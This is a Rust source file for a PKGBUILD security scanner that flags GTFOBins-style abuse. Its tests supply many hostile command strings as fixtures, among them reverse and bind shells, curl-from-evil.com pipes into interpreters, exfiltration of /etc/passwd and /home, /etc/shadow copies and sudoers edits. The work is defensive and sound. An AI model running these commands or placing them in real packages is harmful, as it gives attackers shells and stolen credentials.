pub mod patterns;

use crate::features::Feature;
use crate::shared::models::PackageContext;
use crate::shared::scoring::{Signal, SignalCategory};

pub struct GtfobinsAnalysis;

impl Feature for GtfobinsAnalysis {
    fn name(&self) -> &str {
        "gtfobins_analysis"
    }

    fn analyze(&self, ctx: &PackageContext) -> Vec<Signal> {
        let Some(ref content) = ctx.pkgbuild_content else {
            return Vec::new();
        };

        let compiled = patterns::compiled_patterns();
        let mut signals = Vec::new();

        for pat in compiled {
            if pat.regex.is_match(content) {
                signals.push(Signal {
                    id: pat.id.clone(),
                    category: SignalCategory::Pkgbuild,
                    points: pat.points,
                    description: pat.description.clone(),
                    is_override_gate: pat.override_gate,
                });
            }
        }

        signals
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn analyze(content: &str) -> Vec<String> {
        let ctx = PackageContext {
            name: "test-pkg".into(),
            metadata: None,
            pkgbuild_content: Some(content.into()),
            install_script_content: None,
            prior_pkgbuild_content: None,
            git_log: vec![],
            maintainer_packages: vec![],
        };
        GtfobinsAnalysis.analyze(&ctx).iter().map(|s| s.id.clone()).collect()
    }

    fn has(ids: &[String], id: &str) -> bool {
        ids.iter().any(|s| s == id)
    }

    // === Reverse Shells ===

    #[test]
    fn revshell_node() {
        let ids = analyze("node -e 'var net = require(\"net\"); var c = new net.Socket(); c.connect(4444, \"10.0.0.1\")'");
        assert!(has(&ids, "G-REVSHELL-NODE"), "got: {ids:?}");
    }

    #[test]
    fn revshell_julia() {
        let ids = analyze("julia -e 'using Sockets; s=TCPSocket(\"10.0.0.1\",4444)'");
        assert!(has(&ids, "G-REVSHELL-JULIA"), "got: {ids:?}");
    }

    #[test]
    fn revshell_tclsh() {
        let ids = analyze("tclsh <<< 'set s [socket 10.0.0.1 4444]'");
        assert!(has(&ids, "G-REVSHELL-TCLSH"), "got: {ids:?}");
    }

    #[test]
    fn revshell_jjs() {
        let ids = analyze("jjs -e 'var p=new java.lang.ProcessBuilder; Runtime.getRuntime().exec(\"/bin/sh\")'");
        assert!(has(&ids, "G-REVSHELL-JJS"), "got: {ids:?}");
    }

    #[test]
    fn revshell_ksh() {
        let ids = analyze("ksh -c 'exec 3<>/dev/tcp/10.0.0.1/4444'");
        assert!(has(&ids, "G-REVSHELL-KSH"), "got: {ids:?}");
    }

    #[test]
    fn revshell_gdb() {
        let ids = analyze("gdb -nx -ex 'python import socket,subprocess,os'");
        assert!(has(&ids, "G-REVSHELL-GDB"), "got: {ids:?}");
    }

    #[test]
    fn revshell_go() {
        let ids = analyze("go run revshell.go # uses net.Dial to connect back");
        assert!(has(&ids, "G-REVSHELL-GO"), "got: {ids:?}");
    }

    #[test]
    fn revshell_socket_util() {
        let ids = analyze("socket -v 10.0.0.1 4444 EXEC:/bin/sh");
        assert!(has(&ids, "G-REVSHELL-SOCKET"), "got: {ids:?}");
    }

    // === Bind Shells ===

    #[test]
    fn bindshell_socat() {
        let ids = analyze("socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/sh");
        assert!(has(&ids, "G-BINDSHELL-SOCAT"), "got: {ids:?}");
    }

    #[test]
    fn bindshell_nc() {
        let ids = analyze("nc -l -p 4444 -e /bin/sh");
        assert!(has(&ids, "G-BINDSHELL-NC"), "got: {ids:?}");
    }

    // === Pipe-to-Interpreter ===

    #[test]
    fn pipe_node() {
        let ids = analyze("curl http://evil.com/payload.js | node");
        assert!(has(&ids, "G-PIPE-NODE"), "got: {ids:?}");
    }

    #[test]
    fn pipe_ruby() {
        let ids = analyze("wget -qO- http://evil.com/x.rb | ruby");
        assert!(has(&ids, "G-PIPE-RUBY"), "got: {ids:?}");
    }

    #[test]
    fn pipe_php() {
        let ids = analyze("curl http://evil.com/backdoor.php | php");
        assert!(has(&ids, "G-PIPE-PHP"), "got: {ids:?}");
    }

    #[test]
    fn pipe_lua() {
        let ids = analyze("curl http://evil.com/payload.lua | lua");
        assert!(has(&ids, "G-PIPE-LUA"), "got: {ids:?}");
    }

    #[test]
    fn pipe_tclsh() {
        let ids = analyze("curl http://evil.com/script.tcl | tclsh");
        assert!(has(&ids, "G-PIPE-TCLSH"), "got: {ids:?}");
    }

    #[test]
    fn pipe_rscript() {
        let ids = analyze("curl http://evil.com/exploit.R | Rscript");
        assert!(has(&ids, "G-PIPE-RSCRIPT"), "got: {ids:?}");
    }

    #[test]
    fn pipe_julia() {
        let ids = analyze("curl http://evil.com/payload.jl | julia");
        assert!(has(&ids, "G-PIPE-JULIA"), "got: {ids:?}");
    }

    #[test]
    fn pipe_awk() {
        let ids = analyze("curl http://evil.com/exploit.awk | gawk -f -");
        assert!(has(&ids, "G-PIPE-AWK"), "got: {ids:?}");
    }

    #[test]
    fn pipe_jjs() {
        let ids = analyze("wget -qO- http://evil.com/nashorn.js | jjs");
        assert!(has(&ids, "G-PIPE-JJS"), "got: {ids:?}");
    }

    #[test]
    fn pipe_ksh() {
        let ids = analyze("curl http://evil.com/script.sh | ksh");
        assert!(has(&ids, "G-PIPE-KSH"), "got: {ids:?}");
    }

    #[test]
    fn pipe_csh() {
        let ids = analyze("curl http://evil.com/x | csh");
        assert!(has(&ids, "G-PIPE-CSH"), "got: {ids:?}");
    }

    #[test]
    fn pipe_zsh() {
        let ids = analyze("curl http://evil.com/x | zsh");
        assert!(has(&ids, "G-PIPE-ZSH"), "got: {ids:?}");
    }

    #[test]
    fn pipe_fish() {
        let ids = analyze("curl http://evil.com/x | fish");
        assert!(has(&ids, "G-PIPE-FISH"), "got: {ids:?}");
    }

    #[test]
    fn pipe_dash() {
        let ids = analyze("curl http://evil.com/x | dash");
        assert!(has(&ids, "G-PIPE-DASH"), "got: {ids:?}");
    }

    #[test]
    fn pipe_elvish() {
        let ids = analyze("curl http://evil.com/x | elvish");
        assert!(has(&ids, "G-PIPE-ELVISH"), "got: {ids:?}");
    }

    #[test]
    fn alt_pipe_shell() {
        let ids = analyze("aria2c http://evil.com/script.sh -o - | sh");
        assert!(has(&ids, "G-ALT-PIPE-SHELL"), "got: {ids:?}");
    }

    #[test]
    fn alt_pipe_shell_lwp() {
        let ids = analyze("lwp-download http://evil.com/x - | bash");
        assert!(has(&ids, "G-ALT-PIPE-SHELL"), "got: {ids:?}");
    }

    #[test]
    fn alt_pipe_shell_finger() {
        let ids = analyze("finger payload@evil.com | sh");
        assert!(has(&ids, "G-ALT-PIPE-SHELL"), "got: {ids:?}");
    }

    // === Non-Obvious Command Execution ===

    #[test]
    fn tar_checkpoint() {
        let ids = analyze("tar czf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh");
        assert!(has(&ids, "G-TAR-CHECKPOINT"), "got: {ids:?}");
    }

    #[test]
    fn zip_exec() {
        let ids = analyze("zip /tmp/x.zip /tmp/x -TT 'sh #'");
        assert!(has(&ids, "G-ZIP-EXEC"), "got: {ids:?}");
    }

    #[test]
    fn gdb_exec() {
        let ids = analyze("gdb -nx --batch -ex 'shell id'");
        assert!(has(&ids, "G-GDB-EXEC"), "got: {ids:?}");
    }

    #[test]
    fn vim_shell() {
        let ids = analyze("vim -c ':!sh'");
        assert!(has(&ids, "G-VIM-SHELL"), "got: {ids:?}");
    }

    #[test]
    fn expect_exec() {
        let ids = analyze("expect -c 'spawn sh'");
        assert!(has(&ids, "G-EXPECT-EXEC"), "got: {ids:?}");
    }

    #[test]
    fn nsenter() {
        let ids = analyze("nsenter -t 1 -m -p -- /bin/sh");
        assert!(has(&ids, "G-NSENTER"), "got: {ids:?}");
    }

    #[test]
    fn capsh() {
        let ids = analyze("capsh -- -c 'id'");
        assert!(has(&ids, "G-CAPSH"), "got: {ids:?}");
    }

    #[test]
    fn unshare() {
        let ids = analyze("unshare -r /bin/bash");
        assert!(has(&ids, "G-UNSHARE"), "got: {ids:?}");
    }

    #[test]
    fn nmap_script() {
        let ids = analyze("nmap --script=http-backdoor 10.0.0.1");
        assert!(has(&ids, "G-NMAP-SCRIPT"), "got: {ids:?}");
    }

    #[test]
    fn ssh_proxycommand() {
        let ids = analyze("ssh -o ProxyCommand='sh -c /tmp/payload' x");
        assert!(has(&ids, "G-SSH-PROXYCOMMAND"), "got: {ids:?}");
    }

    #[test]
    fn pkexec() {
        let ids = analyze("pkexec /bin/sh");
        assert!(has(&ids, "G-PKEXEC"), "got: {ids:?}");
    }

    #[test]
    fn emacs_exec() {
        let ids = analyze("emacs -batch --eval '(shell-command \"id\")'");
        assert!(has(&ids, "G-EMACS-EXEC"), "got: {ids:?}");
    }

    #[test]
    fn rlwrap_shell() {
        let ids = analyze("rlwrap nc 10.0.0.1 4444");
        assert!(has(&ids, "G-RLWRAP-SHELL"), "got: {ids:?}");
    }

    #[test]
    fn sqlite_exec() {
        let ids = analyze("sqlite3 /dev/null '.shell /bin/sh'");
        assert!(has(&ids, "G-SQLITE-EXEC"), "got: {ids:?}");
    }

    #[test]
    fn screen_exec() {
        let ids = analyze("screen -X stuff 'id\\n'");
        assert!(has(&ids, "G-SCREEN-EXEC"), "got: {ids:?}");
    }

    #[test]
    fn tmux_send() {
        let ids = analyze("tmux send-keys 'id' Enter");
        assert!(has(&ids, "G-TMUX-SEND"), "got: {ids:?}");
    }

    #[test]
    fn busybox_shell() {
        let ids = analyze("busybox nc -e /bin/sh 10.0.0.1 4444");
        assert!(has(&ids, "G-BUSYBOX-SHELL"), "got: {ids:?}");
    }

    #[test]
    fn doas() {
        let ids = analyze("doas /bin/sh");
        assert!(has(&ids, "G-DOAS"), "got: {ids:?}");
    }

    #[test]
    fn chroot_shell() {
        let ids = analyze("chroot /newroot /bin/bash");
        assert!(has(&ids, "G-CHROOT-SHELL"), "got: {ids:?}");
    }

    #[test]
    fn docker_run_volume() {
        let ids = analyze("docker run -v /:/host alpine sh");
        assert!(has(&ids, "G-DOCKER-RUN"), "got: {ids:?}");
    }

    #[test]
    fn ctr_exec() {
        let ids = analyze("ctr image pull docker.io/library/alpine && ctr run docker.io/library/alpine test");
        assert!(has(&ids, "G-CTR-EXEC"), "got: {ids:?}");
    }

    #[test]
    fn kubectl_exec() {
        let ids = analyze("kubectl exec -it pod -- /bin/sh");
        assert!(has(&ids, "G-KUBECTL-EXEC"), "got: {ids:?}");
    }

    #[test]
    fn lxc_exec() {
        let ids = analyze("lxc exec container -- /bin/sh");
        assert!(has(&ids, "G-LXD-EXEC"), "got: {ids:?}");
    }

    #[test]
    fn snap_shell() {
        let ids = analyze("snap run --shell pkg");
        assert!(has(&ids, "G-SNAP-RUN"), "got: {ids:?}");
    }

    #[test]
    fn systemd_run() {
        let ids = analyze("systemd-run /bin/sh");
        assert!(has(&ids, "G-SYSTEMD-RUN"), "got: {ids:?}");
    }

    #[test]
    fn strace_exec() {
        let ids = analyze("strace -o /dev/null /bin/sh");
        assert!(has(&ids, "G-STRACE-EXEC"), "got: {ids:?}");
    }

    #[test]
    fn script_exec() {
        let ids = analyze("script -c /bin/sh /dev/null");
        assert!(has(&ids, "G-SCRIPT-EXEC"), "got: {ids:?}");
    }

    #[test]
    fn start_stop_daemon() {
        let ids = analyze("start-stop-daemon --start --exec /bin/sh");
        assert!(has(&ids, "G-START-STOP-DAEMON"), "got: {ids:?}");
    }

    #[test]
    fn flock_exec() {
        let ids = analyze("flock /tmp/lock bash -c 'curl http://evil.com | bash'");
        assert!(has(&ids, "G-FLOCK-EXEC"), "got: {ids:?}");
    }

    // === Alternative Download Utilities ===

    #[test]
    fn download_aria2c() {
        let ids = analyze("aria2c http://evil.com/payload");
        assert!(has(&ids, "G-DOWNLOAD-ARIA2C"), "got: {ids:?}");
    }

    #[test]
    fn download_lwp() {
        let ids = analyze("lwp-download http://evil.com/payload /tmp/x");
        assert!(has(&ids, "G-DOWNLOAD-LWP"), "got: {ids:?}");
    }

    #[test]
    fn download_tftp() {
        let ids = analyze("tftp 10.0.0.1 -c get payload");
        assert!(has(&ids, "G-DOWNLOAD-TFTP"), "got: {ids:?}");
    }

    #[test]
    fn download_finger() {
        let ids = analyze("finger payload@evil.com > /tmp/payload");
        assert!(has(&ids, "G-DOWNLOAD-FINGER"), "got: {ids:?}");
    }

    #[test]
    fn download_whois() {
        let ids = analyze("whois -h evil.com -p 4444 data");
        assert!(has(&ids, "G-DOWNLOAD-WHOIS"), "got: {ids:?}");
    }

    #[test]
    fn download_ftp() {
        let ids = analyze("ftp -n <<EOF\nopen evil.com\nget payload\nEOF");
        assert!(has(&ids, "G-DOWNLOAD-FTP"), "got: {ids:?}");
    }

    #[test]
    fn download_smbclient() {
        let ids = analyze("smbclient //evil.com/share -c 'get payload.bin'");
        assert!(has(&ids, "G-DOWNLOAD-SMBCLIENT"), "got: {ids:?}");
    }

    #[test]
    fn download_scp() {
        let ids = analyze("scp attacker@evil.com:/tmp/payload /tmp/payload");
        assert!(has(&ids, "G-DOWNLOAD-SCP"), "got: {ids:?}");
    }

    #[test]
    fn download_rsync() {
        let ids = analyze("rsync attacker@evil.com:/tmp/payload /tmp/payload");
        assert!(has(&ids, "G-DOWNLOAD-RSYNC"), "got: {ids:?}");
    }

    #[test]
    fn download_node() {
        let ids = analyze("npx evil-package");
        assert!(has(&ids, "G-DOWNLOAD-NODE"), "got: {ids:?}");
    }

    #[test]
    fn download_urlget() {
        let ids = analyze("urlget http://evil.com/payload > /tmp/x");
        assert!(has(&ids, "G-DOWNLOAD-URLGET"), "got: {ids:?}");
    }

    // === Interpreter Inline Execution ===

    #[test]
    fn node_inline() {
        let ids = analyze("node -e 'console.log(process.env.HOME)'");
        assert!(has(&ids, "G-NODE-INLINE"), "got: {ids:?}");
    }

    #[test]
    fn ruby_inline() {
        let ids = analyze("ruby -e 'system(\"id\")'");
        assert!(has(&ids, "G-RUBY-INLINE"), "got: {ids:?}");
    }

    #[test]
    fn php_inline() {
        let ids = analyze("php -r 'system(\"id\");'");
        assert!(has(&ids, "G-PHP-INLINE"), "got: {ids:?}");
    }

    #[test]
    fn lua_inline() {
        let ids = analyze("lua -e 'os.execute(\"/bin/sh\")'");
        assert!(has(&ids, "G-LUA-INLINE"), "got: {ids:?}");
    }

    #[test]
    fn r_inline() {
        let ids = analyze("Rscript -e 'system(\"id\")'");
        assert!(has(&ids, "G-R-INLINE"), "got: {ids:?}");
    }

    #[test]
    fn julia_inline() {
        let ids = analyze("julia -e 'run(`id`)'");
        assert!(has(&ids, "G-JULIA-INLINE"), "got: {ids:?}");
    }

    #[test]
    fn java_inline() {
        let ids = analyze("jshell -s <<< 'Runtime.getRuntime().exec(\"id\")'");
        assert!(has(&ids, "G-JAVA-INLINE"), "got: {ids:?}");
    }

    #[test]
    fn tclsh_inline() {
        let ids = analyze("tclsh <<< 'exec id'");
        assert!(has(&ids, "G-TCLSH-INLINE"), "got: {ids:?}");
    }

    #[test]
    fn gdb_python() {
        let ids = analyze("gdb -nx -ex 'python import os; os.system(\"id\")'");
        assert!(has(&ids, "G-GDB-PYTHON"), "got: {ids:?}");
    }

    #[test]
    fn gnuplot_exec() {
        let ids = analyze("gnuplot -e 'system(\"id\")'");
        assert!(has(&ids, "G-GNUPLOT-EXEC"), "got: {ids:?}");
    }

    #[test]
    fn octave_exec() {
        let ids = analyze("octave --eval 'system(\"id\")'");
        assert!(has(&ids, "G-OCTAVE-EXEC"), "got: {ids:?}");
    }

    #[test]
    fn clisp_exec() {
        let ids = analyze("clisp -x '(shell \"id\")'");
        assert!(has(&ids, "G-CLISP-EXEC"), "got: {ids:?}");
    }

    #[test]
    fn guile_exec() {
        let ids = analyze("guile -c '(system \"id\")'");
        assert!(has(&ids, "G-GUILE-EXEC"), "got: {ids:?}");
    }

    // === Library Injection ===

    #[test]
    fn ld_library_path() {
        let ids = analyze("LD_LIBRARY_PATH=/tmp/evil ./binary");
        assert!(has(&ids, "G-LD-LIBRARY-PATH"), "got: {ids:?}");
    }

    #[test]
    fn ldconfig_custom() {
        let ids = analyze("ldconfig -f /tmp/evil.conf");
        assert!(has(&ids, "G-LDCONFIG-CUSTOM"), "got: {ids:?}");
    }

    // === File Operations ===

    #[test]
    fn tee_sensitive() {
        let ids = analyze("echo 'user ALL=(ALL) NOPASSWD: ALL' | tee /etc/sudoers");
        assert!(has(&ids, "G-TEE-SENSITIVE"), "got: {ids:?}");
    }

    #[test]
    fn cp_sensitive() {
        let ids = analyze("cp /etc/shadow /tmp/shadow_dump");
        assert!(has(&ids, "G-CP-SENSITIVE"), "got: {ids:?}");
    }

    // === Encoding/Exfiltration ===

    #[test]
    fn basenc_decode() {
        let ids = analyze("echo payload | basenc --base64 -d > /tmp/payload");
        assert!(has(&ids, "G-BASENC-DECODE"), "got: {ids:?}");
    }

    #[test]
    fn hping_exfil() {
        let ids = analyze("hping3 -c 1 -E /etc/passwd -d 500 evil.com");
        assert!(has(&ids, "G-HPING-EXFIL"), "got: {ids:?}");
    }

    #[test]
    fn restic_exfil() {
        let ids = analyze("restic -r rest:http://evil.com/repo backup /home");
        assert!(has(&ids, "G-RESTIC-EXFIL"), "got: {ids:?}");
    }

    // === False positive checks ===

    #[test]
    fn benign_pkgbuild_no_signals() {
        let ids = analyze(r#"
pkgname=yay
pkgver=12.4.2
pkgrel=1
arch=('x86_64')
depends=('pacman' 'git')
makedepends=('go')
source=("${pkgname}-${pkgver}.tar.gz::https://github.com/Jguer/yay/archive/v${pkgver}.tar.gz")
sha256sums=('abc123def456')

build() {
    cd "$pkgname-$pkgver"
    export CGO_CPPFLAGS="${CPPFLAGS}"
    export GOFLAGS="-buildmode=pie -trimpath"
    go build
}

package() {
    install -Dm755 yay "${pkgdir}/usr/bin/yay"
}
"#);
        assert!(ids.is_empty(), "Benign PKGBUILD should trigger no signals, got: {ids:?}");
    }

    #[test]
    fn benign_node_build_no_pipe() {
        // node is used in build process but not piped from download
        let ids = analyze(r#"
build() {
    cd "$pkgname-$pkgver"
    npm install
    npm run build
}
"#);
        // Should not trigger G-PIPE-NODE
        assert!(!has(&ids, "G-PIPE-NODE"), "npm install should not trigger pipe-to-node");
    }

    #[test]
    fn benign_tar_extract() {
        // Normal tar extract without checkpoint-action
        let ids = analyze("tar xf source.tar.gz");
        assert!(!has(&ids, "G-TAR-CHECKPOINT"), "Normal tar extract should not trigger");
    }

    #[test]
    fn benign_rsync_local() {
        // Local rsync without remote
        let ids = analyze("rsync -a src/ dest/");
        assert!(!has(&ids, "G-DOWNLOAD-RSYNC"), "Local rsync should not trigger");
    }
}
